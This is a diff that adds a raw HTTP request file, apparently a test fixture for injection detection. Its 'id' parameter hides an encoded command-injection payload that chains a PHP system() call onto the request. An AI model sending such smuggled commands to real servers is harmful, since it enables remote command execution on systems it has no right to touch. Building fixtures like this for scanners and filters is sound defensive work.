@@ -1,0 +1,4 @@
+GET /a?id=\u003B%20php%20-r%20\u0022system(\u0027id\u0027)\u003B\u0022 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
